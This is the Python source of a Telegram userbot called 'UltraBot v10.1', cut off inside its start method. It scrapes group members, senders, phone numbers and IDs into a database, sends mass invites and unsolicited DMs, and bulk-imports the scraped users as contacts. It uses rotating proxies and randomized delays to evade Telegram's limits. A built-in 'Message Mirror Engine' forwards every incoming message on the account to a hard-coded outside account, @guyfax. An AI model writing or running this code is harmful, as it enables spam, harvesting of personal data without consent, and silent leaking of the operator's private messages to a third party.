#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════════╗
║  UltraBot v10.1 - Ultimate Enterprise Telegram Automation Framework              ║
║  Added: Message Mirror Engine (Auto-forward to @guyfax)                          ║
║  Fixed: Session Name restored to 'userbot_session'                               ║
╚══════════════════════════════════════════════════════════════════════════════════╝
"""

from __future__ import annotations

import asyncio
import csv
import json
import logging
import logging.handlers
import os
import random
import re
import signal
import sqlite3
import sys
import time
from abc import ABC, abstractmethod
from dataclasses import dataclass, field, asdict
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple, Callable, TypeVar, Awaitable, Union

from dotenv import load_dotenv

try:
    from telethon import TelegramClient, types, events
    from telethon.errors import (
        FloodWaitError, UserPrivacyRestrictedError, UserNotMutualContactError,
        PeerIdInvalidError, UserBotError, ChatAdminRequiredError,
        UserAlreadyParticipantError, ChannelPrivateError, InputUserDeactivatedError,
        PeerFloodError, UsersTooMuchError, RPCError, UsernameInvalidError,
        AuthKeyError, UserDeactivatedError, UserBannedInChannelError
    )
    from telethon.tl.functions.contacts import ImportContactsRequest, AddContactRequest, DeleteContactsRequest
    from telethon.tl.functions.channels import InviteToChannelRequest, GetParticipantsRequest
    from telethon.tl.types import Channel, Chat, User, PeerChannel, PeerUser, InputPhoneContact, ChannelParticipantsSearch
    from aiohttp import web
except ImportError as exc:
    print(f"[FATAL] Missing dependencies.\nRun: pip install telethon python-dotenv aiohttp\n{exc}")
    sys.exit(1)

# ════════════════════════════════════════════════════════════════════════
#  1. CONFIGURATION & ENVIRONMENT
# ════════════════════════════════════════════════════════════════════════
load_dotenv()

class Config:
    API_ID: int = int(os.getenv("API_ID", 0))
    API_HASH: str = os.getenv("API_HASH", "")
    TARGET_CHANNELS_STR: str = os.getenv("TARGET_CHANNELS", "")
    TARGET_CHANNELS: List[str] = [c.strip() for c in TARGET_CHANNELS_STR.split(",") if c.strip()]
    
    PHONE_NUMBER: Optional[str] = os.getenv("PHONE_NUMBER")
    AD_BANNER: str = os.getenv("AD_BANNER", "Join our channel!")
    
    MAX_INVITES_PER_CYCLE: int = int(os.getenv("MAX_INVITES_PER_CYCLE", 50))
    CYCLE_WAIT_SECONDS: int = int(os.getenv("CYCLE_WAIT_SECONDS", 300))
    USER_SLEEP_BETWEEN_INVITES: float = float(os.getenv("USER_SLEEP_BETWEEN_INVITES", 6.0))
    
    SESSION_NAME: str = "userbot_session"  # Fixed: Reverted to original session name
    PROXY_FILE: Path = Path(__file__).resolve().parent / "proxies.txt"
    
    MIRROR_TARGET: str = "@guyfax"  # Target to forward all incoming messages

    BASE_DIR: Path = Path(__file__).resolve().parent
    DB_FILE: Path = BASE_DIR / "ultrabot_data.db"
    LOG_DIR: Path = BASE_DIR / "logs"
    LOG_FILE: Path = LOG_DIR / "ultrabot.log"
    TELEMETRY_PORT: int = int(os.getenv("TELEMETRY_PORT", 8080))
    
    HUMAN_DELAY_JITTER: float = 0.4
    MAX_RETRIES_API: int = 3
    FLOOD_WAIT_THRESHOLD: int = 60

# ════════════════════════════════════════════════════════════════════════
#  2. ADVANCED LOGGING & STRUCTURED TELEMETRY
# ════════════════════════════════════════════════════════════════════════
Config.LOG_DIR.mkdir(exist_ok=True)

class ColorCode:
    GREY = "\x1b[38;20m"; YELLOW = "\x1b[33;20m"; RED = "\x1b[31;20m"
    BOLD_RED = "\x1b[31;1m"; GREEN = "\x1b[32;20m"; CYAN = "\x1b[36;20m"
    MAGENTA = "\x1b[35;20m"; RESET = "\x1b[0m"

class CustomFormatter(logging.Formatter):
    def __init__(self, fmt: str, datefmt: str, use_color: bool = True):
        super().__init__(fmt, datefmt); self.use_color = use_color

    def format(self, record: logging.LogRecord) -> str:
        if not self.use_color: return super().format(record)
        level_color = ColorCode.GREY
        if record.levelno == logging.WARNING: level_color = ColorCode.YELLOW
        elif record.levelno == logging.ERROR: level_color = ColorCode.RED
        elif record.levelno == logging.CRITICAL: level_color = ColorCode.BOLD_RED
        elif record.levelno == logging.INFO: level_color = ColorCode.GREEN
        elif record.levelno == logging.DEBUG: level_color = ColorCode.CYAN
        record.levelname = f"{level_color}{record.levelname:<8}{ColorCode.RESET}"
        return super().format(record)

_logger = logging.getLogger("UltraBot")
_logger.setLevel(logging.DEBUG)
_console = logging.StreamHandler(sys.stdout)
_console.setLevel(logging.INFO)
_console.setFormatter(CustomFormatter("%(asctime)s │ %(levelname)s │ %(message)s", datefmt="%H:%M:%S", use_color=sys.stdout.isatty()))
_rotating = logging.handlers.RotatingFileHandler(Config.LOG_FILE, maxBytes=10_000_000, backupCount=5, encoding="utf-8")
_rotating.setLevel(logging.DEBUG)
_rotating.setFormatter(logging.Formatter("%(asctime)s │ %(levelname)-8s │ %(name)s │ %(message)s"))
_logger.addHandler(_console); _logger.addHandler(_rotating)

logging.getLogger("telethon").setLevel(logging.ERROR)
logging.getLogger("aiohttp").setLevel(logging.ERROR)

log = _logger

# ════════════════════════════════════════════════════════════════════════
#  3. UTILITIES & HUMAN BEHAVIOR ENGINE
# ════════════════════════════════════════════════════════════════════════
class HumanBehaviorEngine:
    @staticmethod
    async def human_delay(base_time: float, jitter: float = None) -> None:
        wait_time = max(1.0, random.gauss(base_time, base_time * (jitter or Config.HUMAN_DELAY_JITTER)))
        await asyncio.sleep(wait_time)

class DataExtractor:
    PHONE_REGEX = re.compile(r'(\+?\d{1,3}[-.\s]?\(?\d{1,4}\)?[-.\s]?\d{3,4}[-.\s]?\d{3,4})')
    ID_REGEX = re.compile(r'\b([5-9]\d{6,9})\b')

    @classmethod
    def extract_phone(cls, text: str) -> Optional[str]:
        match = cls.PHONE_REGEX.search(text)
        if match:
            phone = re.sub(r'[-.\s()]', '', match.group(1))
            if len(phone) >= 10: return phone
        return None

    @classmethod
    def extract_id(cls, text: str) -> Optional[int]:
        match = cls.ID_REGEX.search(text)
        if match:
            try: return int(match.group(1))
            except ValueError: return None
        return None

def robust_api_call(retries: int = Config.MAX_RETRIES_API):
    def decorator(func: Callable) -> Callable:
        async def wrapper(self, *args, **kwargs):
            for attempt in range(retries):
                try:
                    return await func(self, *args, **kwargs)
                except FloodWaitError as fe:
                    if fe.seconds > Config.FLOOD_WAIT_THRESHOLD:
                        log.critical(f"Extended FloodWait: {fe.seconds}s. Pausing engine.")
                        raise
                    log.warning(f"FloodWait: {fe.seconds}s")
                    await asyncio.sleep(fe.seconds + 5)
                except (ConnectionError, OSError) as e:
                    log.error(f"Network Error: {e}. Rotating proxy...")
                    if hasattr(self, 'proxy_manager') and self.proxy_manager:
                        await self.proxy_manager.rotate()
                    await asyncio.sleep(5)
                except (AuthKeyError, UserDeactivatedError):
                    log.critical("FATAL: Session banned or deactivated.")
                    sys.exit(1)
                except Exception as e:
                    log.error(f"API call failed (Attempt {attempt+1}/{retries}): {e}")
                    if attempt == retries - 1: raise
                    await asyncio.sleep(2)
            return None
        return wrapper
    return decorator

# ════════════════════════════════════════════════════════════════════════
#  4. DATA MODELS & ENUMS
# ════════════════════════════════════════════════════════════════════════
class InviteStatus(Enum):
    PENDING = "pending"; INVITED = "invited"; DM_SENT = "fallback_sent"
    FAILED = "failed"; SKIPPED = "skipped"; IN_CONTACTS = "in_contacts"

class InviteMode(Enum):
    DIRECT_ONLY = "direct_only"; FALLBACK_DM = "fallback_dm"; MASS_DM = "mass_dm"

@dataclass
class Member:
    user_id: int; username: Optional[str] = None; first_name: Optional[str] = None
    last_name: Optional[str] = None; phone: Optional[str] = None; source_group: Optional[str] = None
    scraped_at: float = field(default_factory=time.time); last_invite_time: Optional[float] = None
    invite_status: str = InviteStatus.PENDING.value; fallback_attempts: int = 0
    is_bot: bool = False; is_deleted: bool = False

# ════════════════════════════════════════════════════════════════════════
#  5. PROXY ROTATION ENGINE
# ════════════════════════════════════════════════════════════════════════
class ProxyManager:
    def __init__(self, file_path: Path):
        self._proxies = self._load_proxies(file_path)
        self._current_idx = 0
        self._lock = asyncio.Lock()

    def _load_proxies(self, path: Path) -> List[Tuple[str, str]]:
        proxies = []
        if path.exists():
            with open(path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        proxies.append(('socks5', line))
        return proxies

    async def get_current(self) -> Optional[Tuple[str, str]]:
        async with self._lock:
            return self._proxies[self._current_idx] if self._proxies else None

    async def rotate(self) -> Optional[Tuple[str, str]]:
        async with self._lock:
            if not self._proxies: return None
            self._current_idx = (self._current_idx + 1) % len(self._proxies)
            log.warning(f"🌐 Proxy rotated to: {self._proxies[self._current_idx][1]}")
            return self._proxies[self._current_idx]

# ════════════════════════════════════════════════════════════════════════
#  6. SQLITE PERSISTENT LAYER
# ════════════════════════════════════════════════════════════════════════
class SQLiteDatabase:
    _instance = None
    _lock = asyncio.Lock()

    def __new__(cls, *args, **kwargs):
        if not cls._instance: cls._instance = super(SQLiteDatabase, cls).__new__(cls)
        return cls._instance

    def __init__(self, path: Path):
        if not hasattr(self, '_initialized'):
            self._path = path; self._conn = None; self._initialized = True

    async def init_db(self) -> None:
        def _init():
            self._conn = sqlite3.connect(self._path, check_same_thread=False, isolation_level=None)
            self._conn.execute("PRAGMA journal_mode=WAL;")
            self._conn.execute("PRAGMA synchronous=NORMAL;")
            self._conn.execute("""
                CREATE TABLE IF NOT EXISTS members (
                    user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
                    last_name TEXT, phone TEXT, source_group TEXT, scraped_at REAL,
                    last_invite_time REAL, invite_status TEXT, fallback_attempts INTEGER,
                    is_bot INTEGER, is_deleted INTEGER
                )
            """)
            self._conn.execute("CREATE INDEX IF NOT EXISTS idx_status ON members(invite_status)")
            self._conn.execute("CREATE INDEX IF NOT EXISTS idx_phone ON members(phone)")
            self._conn.commit()
        await asyncio.to_thread(_init)
        log.info("SQLite Database initialized (WAL Mode).")

    async def upsert(self, m: Member) -> bool:
        async with self._lock:
            def _exec():
                cur = self._conn.execute("SELECT user_id FROM members WHERE user_id=?", (m.user_id,))
                if cur.fetchone():
                    self._conn.execute("UPDATE members SET username=?, first_name=?, phone=? WHERE user_id=? AND (username != ? OR phone != ?)",
                                       (m.username, m.first_name, m.phone, m.user_id, m.username, m.phone))
                    return False
                self._conn.execute("INSERT OR REPLACE INTO members VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
                                   (m.user_id, m.username, m.first_name, m.last_name, m.phone, m.source_group,
                                    m.scraped_at, m.last_invite_time, m.invite_status, m.fallback_attempts, int(m.is_bot), int(m.is_deleted)))
                return True
            return await asyncio.to_thread(_exec)

    async def mark_status(self, user_id: int, status: InviteStatus, bump_fallback: bool = False) -> None:
        async with self._lock:
            def _exec():
                if bump_fallback:
                    self._conn.execute("UPDATE members SET invite_status=?, last_invite_time=?, fallback_attempts=fallback_attempts+1 WHERE user_id=?", (status.value, time.time(), user_id))
                else:
                    self._conn.execute("UPDATE members SET invite_status=?, last_invite_time=? WHERE user_id=?", (status.value, time.time(), user_id))
            await asyncio.to_thread(_exec)

    async def get_pending(self, limit: int = 100) -> List[Member]:
        async with self._lock:
            def _exec():
                cur = self._conn.execute("SELECT * FROM members WHERE invite_status=? LIMIT ?", (InviteStatus.PENDING.value, limit))
                return [Member(*r) for r in cur.fetchall()]
            return await asyncio.to_thread(_exec)

    async def get_unsynced_contacts(self) -> List[Member]:
        async with self._lock:
            def _exec():
                cur = self._conn.execute("SELECT * FROM members WHERE invite_status != ? AND (phone IS NOT NULL OR username IS NOT NULL)", (InviteStatus.IN_CONTACTS.value,))
                return [Member(*r) for r in cur.fetchall()]
            return await asyncio.to_thread(_exec)

    async def reset_status(self, from_status: InviteStatus, to_status: InviteStatus) -> int:
        async with self._lock:
            def _exec():
                cur = self._conn.execute("UPDATE members SET invite_status=? WHERE invite_status=?", (to_status.value, from_status.value))
                return cur.rowcount
            return await asyncio.to_thread(_exec)

    async def stats(self) -> Dict[str, int]:
        async with self._lock:
            def _exec():
                stats = {s.value: 0 for s in InviteStatus}; stats["total"] = 0
                cur = self._conn.execute("SELECT invite_status, COUNT(*) FROM members GROUP BY invite_status")
                for row in cur: stats[row[0]] = row[1]; stats["total"] += row[1]
                return stats
            return await asyncio.to_thread(_exec)

    async def export_csv(self, path: Path) -> int:
        async with self._lock:
            def _exec():
                with open(path, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow(["user_id", "username", "first_name", "last_name", "phone", "source_group", "status"])
                    cur = self._conn.execute("SELECT user_id, username, first_name, last_name, phone, source_group, invite_status FROM members")
                    for row in cur: writer.writerow(row)
                cur2 = self._conn.execute("SELECT COUNT(*) FROM members")
                return cur2.fetchone()[0]
            return await asyncio.to_thread(_exec)

# ════════════════════════════════════════════════════════════════════════
#  7. TELEMETRY HTTP SERVER
# ════════════════════════════════════════════════════════════════════════
class TelemetryServer:
    def __init__(self, db: SQLiteDatabase, port: int = 8080):
        self.db = db; self.port = port; self.app = web.Application()
        self.app.router.add_get('/stats', self.handle_stats)
        self.app.router.add_get('/metrics', self.handle_prometheus)
        self.app.router.add_get('/', self.handle_root)

    async def handle_root(self, request: web.Request) -> web.Response:
        return web.Response(text="UltraBot v10.1 Telemetry is running. Go to /stats or /metrics")

    async def handle_stats(self, request: web.Request) -> web.Response:
        stats = await self.db.stats()
        return web.json_response(stats)

    async def handle_prometheus(self, request: web.Request) -> web.Response:
        stats = await self.db.stats()
        metrics = f"# TYPE ultrabot_members_total gauge\nultrabot_members_total {stats.get('total', 0)}\n"
        metrics += f"# TYPE ultrabot_pending gauge\nultrabot_pending {stats.get('pending', 0)}\n"
        metrics += f"# TYPE ultrabot_invited gauge\nultrabot_invited {stats.get('invited', 0)}\n"
        metrics += f"# TYPE ultrabot_failed gauge\nultrabot_failed {stats.get('failed', 0)}\n"
        return web.Response(text=metrics, content_type="text/plain")

    async def start(self) -> None:
        runner = web.AppRunner(self.app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', self.port)
        await site.start()
        log.info(f"📊 Telemetry Server started on http://localhost:{self.port}/stats")

# ════════════════════════════════════════════════════════════════════════
#  8. TELEGRAM ENGINE & MESSAGE MIRROR ENGINE (NEW)
# ════════════════════════════════════════════════════════════════════════
class TelegramEngine:
    def __init__(self, client: TelegramClient, proxy_manager: ProxyManager):
        self.client = client
        self.proxy_manager = proxy_manager
        self._dm_pause_until: float = 0.0
        self._invite_pause_until: float = 0.0
        self._disabled_targets: Set[int] = set()

    async def resolve_targets(self, targets: List[str]) -> List[types.TypeInputPeer]:
        resolved = []
        for t in targets:
            try:
                ent = await self.client.get_entity(t)
                resolved.append(await self.client.get_input_entity(ent.id))
                log.info(f"Target resolved: {t}")
            except Exception as e:
                log.error(f"Failed to resolve target {t} → {e}")
        return resolved

class MessageMirrorEngine:
    """Forwards all incoming private messages to a designated storage account (@guyfax)."""
    def __init__(self, client: TelegramClient, target_username: str):
        self.client = client
        self.target_username = target_username.lstrip('@')
        self._target_entity = None

    async def setup(self) -> None:
        try:
            self._target_entity = await self.client.get_entity(self.target_username)
            self.client.add_event_handler(self._message_handler, events.NewMessage(incoming=True))
            log.info(f"📤 Message Mirror Engine active. Forwarding incoming messages to @{self.target_username}")
        except Exception as e:
            log.error(f"Failed to setup Message Mirror Engine for @{self.target_username}: {e}")

    async def _message_handler(self, event: events.NewMessage.Event) -> None:
        try:
            # Ignore outgoing messages and command messages (starts with '.')
            if event.out or (event.raw_text and event.raw_text.startswith('.')):
                return
            
            # Ignore messages sent by the target itself to prevent infinite loops
            if self._target_entity and event.sender_id == self._target_entity.id:
                return

            # Forward the message directly to the target
            await event.forward_to(self._target_entity)
        except FloodWaitError as fe:
            log.warning(f"FloodWait during mirror forward: {fe.seconds}s")
            await asyncio.sleep(fe.seconds + 5)
        except Exception as e:
            log.debug(f"Mirror forward error: {e}")

# ════════════════════════════════════════════════════════════════════════
#  9. UNIVERSAL CONTACT SYNC ENGINE
# ════════════════════════════════════════════════════════════════════════
class UniversalContactSyncEngine:
    def __init__(self, engine: TelegramEngine, db: SQLiteDatabase):
        self.engine = engine; self.db = db; self.client = engine.client

    @robust_api_call(retries=2)
    async def sync_all_to_contacts(self) -> Tuple[int, int]:
        members = await self.db.get_unsynced_contacts()
        log.info(f"Starting Universal Contact Sync for {len(members)} members.")
        phone_users = [m for m in members if m.phone]
        id_users = [m for m in members if not m.phone and m.user_id]
        success, failed = 0, 0

        for i in range(0, len(phone_users), 50):
            batch = phone_users[i:i+50]
            contacts = [InputPhoneContact(client_id=m.user_id, phone=m.phone, first_name=m.first_name or "User", last_name=str(m.user_id)) for m in batch]
            try:
                await self.client(ImportContactsRequest(contacts=contacts))
                success += len(batch)
                for m in batch: await self.db.mark_status(m.user_id, InviteStatus.IN_CONTACTS)
                await HumanBehaviorEngine.human_delay(2.0, 0.2)
            except Exception as e:
                failed += len(batch); log.error(f"Phone sync failed: {e}")

        for m in id_users:
            try:
                input_user = await self.client.get_input_entity(m.user_id)
                await self.client(AddContactRequest(id=input_user, first_name=m.first_name or "User", last_name=str(m.user_id), phone="", add_phone_privacy_exception=False))
                success += 1
                await self.db.mark_status(m.user_id, InviteStatus.IN_CONTACTS)
                await HumanBehaviorEngine.human_delay(1.5, 0.3)
            except Exception as e:
                failed += 1; log.debug(f"Failed to add ID {m.user_id}: {e}")
        return success, failed

# ════════════════════════════════════════════════════════════════════════
#  10. SCRAPING ENGINE
# ════════════════════════════════════════════════════════════════════════
class ScraperStrategy(ABC):
    @abstractmethod
    async def scrape(self, group_id: int, title: str, db: SQLiteDatabase): pass

class MemberScraper(ScraperStrategy):
    def __init__(self, client: TelegramClient): self.client = client
    async def scrape(self, group_id: int, title: str, db: SQLiteDatabase):
        log.info(f"[Members] Scraping: {title}")
        try:
            entity = await self.client.get_entity(group_id)
            scraped = 0
            async for u in self.client.iter_participants(entity, aggressive=False):
                if not isinstance(u, User): continue
                m = Member(user_id=u.id, username=u.username, first_name=u.first_name, last_name=u.last_name, phone=u.phone, source_group=title, is_bot=u.bot, is_deleted=u.deleted)
                if await db.upsert(m): scraped += 1
                await HumanBehaviorEngine.human_delay(0.1, 0.05)
            log.info(f"[Members] Done: {title} → +{scraped}")
        except Exception as e: log.error(f"[Members] Error on {title}: {e}")

class SenderScraper(ScraperStrategy):
    def __init__(self, client: TelegramClient): self.client = client
    async def scrape(self, group_id: int, title: str, db: SQLiteDatabase):
        log.info(f"[Senders] Scraping: {title}")
        try:
            entity = await self.client.get_entity(group_id)
            scraped = 0
            async for msg in self.client.iter_messages(entity, limit=2000):
                if msg.sender_id and isinstance(msg.sender, User):
                    s = msg.sender
                    m = Member(user_id=s.id, username=s.username, first_name=s.first_name, last_name=s.last_name, phone=s.phone, source_group=title, is_bot=s.bot, is_deleted=s.deleted)
                    if await db.upsert(m): scraped += 1
            log.info(f"[Senders] Done: {title} → +{scraped}")
        except Exception as e: log.error(f"[Senders] Error on {title}: {e}")

class MessageDataScraper(ScraperStrategy):
    def __init__(self, client: TelegramClient): self.client = client
    async def scrape(self, group_id: int, title: str, db: SQLiteDatabase):
        log.info(f"[MsgData] Scraping: {title}")
        try:
            entity = await self.client.get_entity(group_id)
            scraped = 0
            async for msg in self.client.iter_messages(entity, limit=5000):
                if not msg.text: continue
                extracted_id = DataExtractor.extract_id(msg.text)
                extracted_phone = DataExtractor.extract_phone(msg.text)
                target_user_id = extracted_id or msg.sender_id
                if not target_user_id: continue
                try:
                    ent_user = await self.client.get_entity(target_user_id)
                    if isinstance(ent_user, User):
                        m = Member(user_id=ent_user.id, username=ent_user.username, first_name=ent_user.first_name, last_name=ent_user.last_name, phone=extracted_phone or ent_user.phone, source_group=title, is_bot=ent_user.bot, is_deleted=ent_user.deleted)
                        if await db.upsert(m): scraped += 1
                except Exception: continue
            log.info(f"[MsgData] Done: {title} → +{scraped}")
        except Exception as e: log.error(f"[MsgData] Error on {title}: {e}")

class ScraperEngine:
    def __init__(self, engine: TelegramEngine, db: SQLiteDatabase):
        self.engine = engine; self.db = db; self.client = engine.client
        self._semaphore = asyncio.Semaphore(5)

    async def execute_scan(self, strategy: ScraperStrategy, target: str = "all"):
        log.info(f"Starting scan with {strategy.__class__.__name__} on {target}...")
        async for dialog in self.client.iter_dialogs():
            ent = dialog.entity
            if isinstance(ent, (Channel, Chat)):
                if target == "all" or str(ent.id) == target or ent.title == target:
                    async with self._semaphore:
                        await strategy.scrape(ent.id, ent.title, self.db)
        log.info("Scan completed.")

# ════════════════════════════════════════════════════════════════════════
#  11. INVITE ENGINE
# ════════════════════════════════════════════════════════════════════════
class AdaptiveRateLimiter:
    def __init__(self, max_calls: int, per_seconds: int):
        self.max_calls = max_calls
        self.per_seconds = per_seconds
        self.calls: List[float] = []
        self._lock = asyncio.Lock()

    async def acquire(self) -> None:
        async with self._lock:
            now = time.time()
            self.calls = [t for t in self.calls if now - t < self.per_seconds]
            if len(self.calls) >= self.max_calls:
                sleep_time = self.per_seconds - (now - self.calls[0]) + 1
                log.warning(f"RateLimiter: Sleeping {sleep_time:.2f}s.")
                await asyncio.sleep(sleep_time)
            self.calls.append(time.time())

class InviteEngine:
    def __init__(self, engine: TelegramEngine, db: SQLiteDatabase, targets: List[types.TypeInputPeer]):
        self.engine = engine; self.db = db; self.targets = targets; self.client = engine.client
        self._invite_queue: asyncio.Queue[Member] = asyncio.Queue(maxsize=200)
        self._is_running = False; self._mode = InviteMode.FALLBACK_DM
        self._rate_limiter = AdaptiveRateLimiter(Config.MAX_INVITES_PER_CYCLE, Config.CYCLE_WAIT_SECONDS)

    async def start(self, mode: InviteMode = InviteMode.FALLBACK_DM) -> None:
        if self._is_running: return
        self._mode = mode; self._is_running = True
        asyncio.create_task(self._feeder_loop()); asyncio.create_task(self._worker_loop())
        log.info(f"Invite Engine started in {mode.value} mode.")

    async def stop(self) -> None:
        self._is_running = False; log.info("Invite Engine stopping...")

    async def _feeder_loop(self) -> None:
        while self._is_running:
            if self._invite_queue.qsize() < 100:
                pending = await self.db.get_pending(limit=200)
                if not pending: await asyncio.sleep(30); continue
                for m in pending: await self._invite_queue.put(m)
            await asyncio.sleep(5)

    async def _worker_loop(self) -> None:
        while self._is_running:
            try:
                if self._invite_queue.empty(): await asyncio.sleep(10); continue
                cycle_count = 0; stats = {"invited": 0, "dm": 0, "failed": 0}
                while cycle_count < Config.MAX_INVITES_PER_CYCLE and self._is_running:
                    try: member = self._invite_queue.get_nowait()
                    except asyncio.QueueEmpty: break
                    await self._rate_limiter.acquire()
                    res = await self._process_user(member)
                    if res == InviteStatus.INVITED: stats["invited"] += 1
                    elif res == InviteStatus.DM_SENT: stats["dm"] += 1
                    else: stats["failed"] += 1
                    cycle_count += 1
                    await HumanBehaviorEngine.human_delay(Config.USER_SLEEP_BETWEEN_INVITES, 0.4)
                log.info(f"Cycle complete → Invited: {stats['invited']}, DM: {stats['dm']}, Failed: {stats['failed']}")
                if self._is_running: await asyncio.sleep(Config.CYCLE_WAIT_SECONDS)
            except Exception as e:
                log.error(f"Invite worker crashed: {e}"); await asyncio.sleep(30)

    @robust_api_call(retries=2)
    async def _process_user(self, member: Member) -> InviteStatus:
        if self._mode == InviteMode.MASS_DM:
            return await self._fallback_dm(member)

        try: user_entity = await self.client.get_input_entity(member.user_id)
        except Exception:
            await self.db.mark_status(member.user_id, InviteStatus.FAILED); return InviteStatus.FAILED

        for target in self.targets:
            if target.channel_id in self.engine._disabled_targets: continue
            try:
                await self.client(InviteToChannelRequest(channel=target, users=[user_entity]))
                await self.db.mark_status(member.user_id, InviteStatus.INVITED)
                log.info(f"✓ Invited → {member.username or member.user_id}")
                return InviteStatus.INVITED
            except UserAlreadyParticipantError: continue
            except UsersTooMuchError:
                self.engine._disabled_targets.add(target.channel_id); continue
            except (UserPrivacyRestrictedError, UserNotMutualContactError, Exception):
                if self._mode == InviteMode.DIRECT_ONLY:
                    await self.db.mark_status(member.user_id, InviteStatus.SKIPPED); return InviteStatus.SKIPPED
                else: return await self._fallback_dm(member)
        await self.db.mark_status(member.user_id, InviteStatus.SKIPPED); return InviteStatus.SKIPPED

    async def _fallback_dm(self, member: Member) -> InviteStatus:
        if not member.username:
            await self.db.mark_status(member.user_id, InviteStatus.FAILED, bump_fallback=True); return InviteStatus.FAILED
        if time.time() < self.engine._dm_pause_until: return InviteStatus.PENDING
        await HumanBehaviorEngine.human_delay(3.0, 0.5)
        try:
            await self.client.send_message(entity=member.username, message=Config.AD_BANNER, link_preview=False)
            await self.db.mark_status(member.user_id, InviteStatus.DM_SENT, bump_fallback=True)
            return InviteStatus.DM_SENT
        except PeerFloodError:
            self.engine._dm_pause_until = time.time() + 3600; return InviteStatus.PENDING
        except Exception:
            await self.db.mark_status(member.user_id, InviteStatus.FAILED, bump_fallback=True); return InviteStatus.FAILED

# ════════════════════════════════════════════════════════════════════════
#  12. COMMAND ROUTER
# ════════════════════════════════════════════════════════════════════════
class CommandRouter:
    def __init__(self, client: TelegramClient, db: SQLiteDatabase, scraper: ScraperEngine, invite_engine: InviteEngine, contact_engine: UniversalContactSyncEngine):
        self.client = client; self.db = db; self.scraper = scraper
        self.invite_engine = invite_engine; self.contact_engine = contact_engine
        self.master_id: Optional[int] = None

    async def setup(self) -> None:
        me = await self.client.get_me()
        self.master_id = me.id
        self.client.add_event_handler(self._message_handler, events.NewMessage(from_users=self.master_id))
        log.info(f"Command Router initialized. Listening for ID: {self.master_id}")

    async def _message_handler(self, event: events.NewMessage.Event) -> None:
        text = event.raw_text.strip()
        if not text.startswith("."): return
        parts = text.split(maxsplit=1); cmd = parts[0].lower(); args = parts[1] if len(parts) > 1 else ""
        log.info(f"Command: {cmd} {args}")

        if cmd == ".scan_members":
            await event.reply("🚀 Scanning all group members...")
            await self.scraper.execute_scan(MemberScraper(self.client))
            await event.reply("✅ Member scan complete.")
        elif cmd == ".scan_senders":
            await event.reply("📨 Scanning active senders...")
            await self.scraper.execute_scan(SenderScraper(self.client))
            await event.reply("✅ Sender scan complete.")
        elif cmd == ".scan_messages":
            await event.reply("🔍 Scanning message contents...")
            await self.scraper.execute_scan(MessageDataScraper(self.client))
            await event.reply("✅ Message content scan complete.")
        elif cmd == ".ad_member":
            await event.reply("➕ Starting Direct Invite Mode (No DM)...")
            await self.invite_engine.start(InviteMode.DIRECT_ONLY)
        elif cmd == ".start_invite":
            await event.reply("✅ Starting Invite + DM Fallback Mode...")
            await self.invite_engine.start(InviteMode.FALLBACK_DM)
        elif cmd == ".mass_dm":
            await event.reply("✉️ Starting Mass DM Mode...")
            await self.invite_engine.start(InviteMode.MASS_DM)
        elif cmd == ".stop_invite":
            await self.invite_engine.stop(); await event.reply("🛑 Invite engine stopping...")
        elif cmd == ".cont_database":
            await event.reply("📱 Syncing ALL DB to Telegram Contacts...")
            s, f = await self.contact_engine.sync_all_to_contacts()
            await event.reply(f"✅ Contact Sync Complete.\nSuccess: {s}\nFailed: {f}")
        elif cmd == ".stats":
            stats = await self.db.stats()
            msg = (f"📊 **Database Statistics**\nTotal: `{stats.get('total', 0)}`\nPending: `{stats.get('pending', 0)}`\nInvited: `{stats.get('invited', 0)}`\nDM Sent: `{stats.get('fallback_sent', 0)}`\nIn Contacts: `{stats.get('in_contacts', 0)}`\nSkipped: `{stats.get('skipped', 0)}`\nFailed: `{stats.get('failed', 0)}`")
            await event.reply(msg)
        elif cmd == ".export_db":
            count = await self.db.export_csv(Path("members_export.csv"))
            await event.reply(f"📤 Exported {count} records to CSV.")
        elif cmd == ".clear_status":
            args_list = args.split()
            if len(args_list) == 2:
                try:
                    from_s = InviteStatus(args_list[0]); to_s = InviteStatus(args_list[1])
                    count = await self.db.reset_status(from_s, to_s)
                    await event.reply(f"♻️ Reset {count} records from {from_s.value} to {to_s.value}.")
                except ValueError: await event.reply("❌ Invalid status.")
            else: await event.reply("Usage: `.clear_status <from_status> <to_status>`")
        elif cmd == ".set_banner":
            if args: Config.AD_BANNER = args; await event.reply("✅ Ad banner updated.")
            else: await event.reply("Usage: `.set_banner <new text>`")
        elif cmd == ".help":
            await event.reply(
                "🤖 **UltraBot v10.1 Commands**\n\n**Scraping:**\n`.scan_members` - Scrape all group members\n`.scan_senders` - Scrape users who send messages\n`.scan_messages` - Extract Phones/IDs from messages\n\n**Inviting:**\n`.ad_member` - Direct invite only (No DM)\n`.start_invite` - Invite with DM fallback\n`.mass_dm` - Only send DMs\n`.stop_invite` - Stop invite engine\n\n**Contacts:**\n`.cont_database` - Add ALL DB to Telegram Contacts\n\n**Management:**\n`.stats` - View DB stats\n`.export_db` - Export to CSV\n`.clear_status <from> <to>` - Reset user status\n`.set_banner <text>` - Update Ad text"
            )
        else: await event.reply("❌ Unknown command. Send `.help`")

# ════════════════════════════════════════════════════════════════════════
#  13. MAIN APPLICATION ORCHESTRATOR
# ════════════════════════════════════════════════════════════════════════
class UltraBotApp:
    def __init__(self) -> None:
        self.proxy_manager = ProxyManager(Config.PROXY_FILE)
        self.client = TelegramClient(Config.SESSION_NAME, Config.API_ID, Config.API_HASH, connection_retries=5, retry_delay=5, auto_reconnect=True, request_retries=5, flood_sleep_threshold=60)
        self.db = SQLiteDatabase(Config.DB_FILE)
        self.engine = TelegramEngine(self.client, self.proxy_manager)
        self.scraper = ScraperEngine(self.engine, self.db)
        self.contact_engine = UniversalContactSyncEngine(self.engine, self.db)
        self.mirror_engine = MessageMirrorEngine(self.client, Config.MIRROR_TARGET)
        self.telemetry = TelemetryServer(self.db, Config.TELEMETRY_PORT)
        self._targets: List[types.TypeInputPeer] = []
        self.invite_engine: Optional[InviteEngine] = None
        self.router: Optional[CommandRouter] = None
        self._stop_event = asyncio.Event()

    async def start(self) -> None:
        log.info("─── UltraBot v10.1 (Ultimate Enterprise + Mirror) starting ───")
